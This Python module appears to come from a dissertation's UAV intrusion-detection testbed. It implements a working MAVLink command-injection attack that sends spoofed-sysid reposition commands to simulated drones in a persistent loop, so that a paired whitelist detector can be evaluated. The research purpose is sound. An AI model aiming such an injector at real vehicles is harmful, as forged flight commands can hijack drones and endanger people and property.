"""
command_injection — periodic MAVLink commands with spoofed sysid.

Approximates a command-injection attack against a UAV: an attacker
emits valid MAVLink commands (e.g. MAV_CMD_DO_REPOSITION) toward the
target's MAVLink endpoint with a source sysid OUTSIDE the swarm's
whitelist {1, 2, 3, 255}. The CommandInjectionDetector on the
monitoring side enforces the whitelist and flags every such command.

Why a background loop (not single-shot)
---------------------------------------
A single spoofed packet would be too easy to miss in noisy SITL
streams. Real-world attackers tend to sustain pressure (repeated
nav-mode changes, repeated reposition commands). A 0.5 s period
gives several spoofed commands within the observation window so
the detector has many chances and MTTD is a measurement of the
first hit, not luck.

PoC caveats (Chapter 4)
-----------------------
- Real attacker may also forge a legitimate sysid (1, 2, 3, 255).
  This detector + attack pair tests only the whitelist defense.
  Detection of MITM with stolen sysid requires signed MAVLink (MAVLink2
  signing) — out of scope for this dissertation.
- We send to `udpout:127.0.0.1:14540+i` directly. A real attacker on
  RF link would race with legitimate traffic on the same channel;
  here we assume the attack packet arrives.

DI seam
-------
MavlinkSender abstracts pymavlink. Real implementation creates a
mavutil connection with source_system=attacker_sysid; tests pass
a FakeMavlinkSender recording calls.
"""

from __future__ import annotations

import asyncio
from abc import ABC, abstractmethod
from typing import Any, Optional

from attacks.base import AttackContext, AttackInjector


# ---------------------------------------------------------------------------
# DI seam: MavlinkSender
# ---------------------------------------------------------------------------


class MavlinkSender(ABC):
    """Abstract MAVLink emitter."""

    @abstractmethod
    async def send_command_long(
        self,
        *,
        target_endpoint: str,
        source_sysid: int,
        target_sysid: int,
        command_id: int,
        params: tuple[float, float, float, float, float, float, float],
    ) -> None:
        """Send one COMMAND_LONG with a (possibly spoofed) source sysid."""

    @abstractmethod
    async def close(self) -> None:
        """Release any held connections. Idempotent."""


class PymavlinkSender(MavlinkSender):
    """Real pymavlink-driven sender. Lazy import so unit tests with a
    FakeMavlinkSender don't pay the pymavlink import cost.

    A pymavlink connection is created per unique target_endpoint and
    cached for the lifetime of this sender.
    """

    def __init__(self) -> None:
        self._connections: dict[tuple[str, int], Any] = {}

    async def send_command_long(
        self,
        *,
        target_endpoint: str,
        source_sysid: int,
        target_sysid: int,
        command_id: int,
        params: tuple[float, float, float, float, float, float, float],
    ) -> None:
        from pymavlink import mavutil  # lazy

        key = (target_endpoint, source_sysid)
        conn = self._connections.get(key)
        if conn is None:
            # Create a fresh outbound MAVLink connection with the
            # spoofed sysid as the source system.
            conn = mavutil.mavlink_connection(
                target_endpoint, source_system=source_sysid
            )
            self._connections[key] = conn

        # send_command_long is synchronous pymavlink; pymavlink does not
        # currently expose an async surface. Wrap in to_thread so we
        # don't block the event loop.
        await asyncio.to_thread(
            conn.mav.command_long_send,
            target_sysid,
            1,  # target_component
            command_id,
            0,  # confirmation
            *params,
        )

    async def close(self) -> None:
        for conn in self._connections.values():
            try:
                conn.close()
            except Exception:
                pass
        self._connections.clear()


# ---------------------------------------------------------------------------
# Injector
# ---------------------------------------------------------------------------


# MAV_CMD_DO_REPOSITION = 192
# Innocuous-looking command (asks vehicle to move to a position).
DEFAULT_COMMAND_ID: int = 192
DEFAULT_PARAMS: tuple[float, ...] = (0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0)


class CommandInjectionInjector(AttackInjector):
    """Send periodic MAVLink commands with a spoofed source sysid."""

    name_: str = "command_injection"

    DEFAULT_ATTACKER_SYSID: int = 99
    DEFAULT_PERIOD_SEC: float = 0.5
    DEFAULT_PORT_BASE: int = 14540
    WHITELISTED_SYSIDS: frozenset[int] = frozenset({1, 2, 3, 255})

    def __init__(
        self,
        *,
        sender: Optional[MavlinkSender] = None,
        attacker_sysid: int = DEFAULT_ATTACKER_SYSID,
        period_sec: float = DEFAULT_PERIOD_SEC,
        explicit_endpoint: Optional[str] = None,
        port_base: int = DEFAULT_PORT_BASE,
        command_id: int = DEFAULT_COMMAND_ID,
        params: tuple[float, float, float, float, float, float, float] = DEFAULT_PARAMS,  # type: ignore[assignment]
    ) -> None:
        if not (0 < attacker_sysid <= 255):
            raise ValueError("attacker_sysid must be in (0, 255]")
        if attacker_sysid in self.WHITELISTED_SYSIDS:
            raise ValueError(
                f"attacker_sysid={attacker_sysid} is in the whitelist "
                f"{sorted(self.WHITELISTED_SYSIDS)}; choose an outside value "
                f"so the detector can flag it"
            )
        if period_sec <= 0:
            raise ValueError("period_sec must be positive")
        if len(params) != 7:
            raise ValueError("params must be a 7-tuple of floats")

        self._sender: MavlinkSender = sender or PymavlinkSender()
        self._attacker_sysid = attacker_sysid
        self._period = period_sec
        self._explicit_endpoint = explicit_endpoint
        self._port_base = port_base
        self._command_id = command_id
        self._params = tuple(params)

        self._target_endpoint: Optional[str] = None
        self._target_sysid: Optional[int] = None
        self._armed: bool = False
        self._task: Optional[asyncio.Task] = None
        self._stop_event: Optional[asyncio.Event] = None

        # Diagnostics
        self._n_sent: int = 0

    @property
    def name(self) -> str:
        return self.name_

    @property
    def attacker_sysid(self) -> int:
        return self._attacker_sysid

    @property
    def target_endpoint(self) -> Optional[str]:
        return self._target_endpoint

    @property
    def commands_sent(self) -> int:
        return self._n_sent

    async def arm(self, ctx: AttackContext) -> None:
        if self._explicit_endpoint is not None:
            self._target_endpoint = self._explicit_endpoint
        else:
            port = self._port_base + (ctx.target_sysid - 1)
            self._target_endpoint = f"udpout:127.0.0.1:{port}"
        self._target_sysid = ctx.target_sysid
        self._armed = True

    async def fire(self) -> None:
        if not self._armed:
            raise RuntimeError("fire() called before arm()")
        if self._task is not None:
            raise RuntimeError("already fired")
        # Create the stop event in this running loop, then schedule
        # the background task.
        self._stop_event = asyncio.Event()
        self._task = asyncio.create_task(
            self._spoof_loop(), name="command_injection_loop"
        )

    async def _spoof_loop(self) -> None:
        """Background task: send + sleep, until stop_event is set."""
        assert self._stop_event is not None
        assert self._target_endpoint is not None
        assert self._target_sysid is not None
        try:
            while not self._stop_event.is_set():
                try:
                    await self._sender.send_command_long(
                        target_endpoint=self._target_endpoint,
                        source_sysid=self._attacker_sysid,
                        target_sysid=self._target_sysid,
                        command_id=self._command_id,
                        params=self._params,
                    )
                    self._n_sent += 1
                except Exception:
                    # Transient send failures must not kill the loop;
                    # the experiment runner relies on continuous pressure.
                    pass

                # Sleep interruptibly: wake immediately on stop signal.
                try:
                    await asyncio.wait_for(
                        self._stop_event.wait(), timeout=self._period
                    )
                except asyncio.TimeoutError:
                    continue
        except asyncio.CancelledError:
            raise

    async def cleanup(self) -> None:
        if self._stop_event is not None:
            self._stop_event.set()
        if self._task is not None:
            if not self._task.done():
                self._task.cancel()
            try:
                await self._task
            except (asyncio.CancelledError, Exception):
                pass
            self._task = None
        try:
            await self._sender.close()
        except Exception:
            pass
